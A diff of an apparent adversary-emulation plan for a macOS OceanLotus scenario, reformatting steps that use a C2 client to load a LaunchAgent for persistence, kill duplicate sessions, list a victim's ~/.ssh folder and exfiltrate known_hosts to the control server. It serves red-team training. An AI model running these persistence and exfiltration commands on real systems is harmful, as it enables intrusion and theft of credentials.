@@ -225,34 +225,33 @@ The implant opens a decoy word document while establishing a connection with the
    ```
 
 
-<details><summary>Extra Credit</summary>
-  
-This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon. The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
+   <details><summary>Extra Credit</summary>
+     
+      This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon. The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
+      
+      Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
+      
+      1. Load the LaunchAgent using `launchctl`
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
+         ````
+      1. List out the processes using the com.apple.launchpad plist
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+         ```
+      1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
+         ```
+      
+      1. Veify we only have one running process using the com.apple.launchpad plist.
+         ```
+         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+         ```
+      1. Continue hacking...
 
-Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
-
-1. Load the LaunchAgent using `launchctl`
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
-   ````
-1. List out the processes using the com.apple.launchpad plist
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-   ```
-1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
-   ```
-
-1. Veify we only have one running process using the com.apple.launchpad plist.
-   ```
-   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-   ```
-1. Continue hacking...
-
-   
-</details>
-
+   </details>
+<br>
 
 ### 🔮 Reference Code & Reporting
 <br>
@@ -274,6 +273,7 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    ```zsh
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/.ssh/"}'
    ```
+   
    Expected Output:
    ```
    [SUCCESS] 2023/08/18 18:20:13 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
@@ -291,6 +291,7 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    
    [SUCCESS] 2023/08/18 18:20:22 Successfully set task output.
    ```
+   
 1. Exfil the Known Host File for review.  
    ```zsh
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_upload_file", "arg":"/Users/hpotter/.ssh/known_hosts"}'
@@ -305,6 +306,7 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    [INFO] 2023/08/18 18:29:30 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
    [SUCCESS] 2023/08/18 18:29:30 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
    ```
+   
 1. Verify the file was uploaded to the control server.
    ```
    cat ./files/known_hosts
@@ -335,9 +337,9 @@ Note: As a result of our decision to hardcode the implant UUIDs to enable the co
    sudo chown -R $(whoami) /usr/local/Cellar
    dscl
    ...
-   [SUCCESS] 2023/08/18 18:36:28 Successfully set task output.
    ```
-   Reviewing the history file, we see they often run admin and file managment commands to a linux server. 
+   
+   Reviewing the history file, we see the user scp commands to the specified IP address. 
 
 ### 🔮 Reference Code & Reporting
 <br>
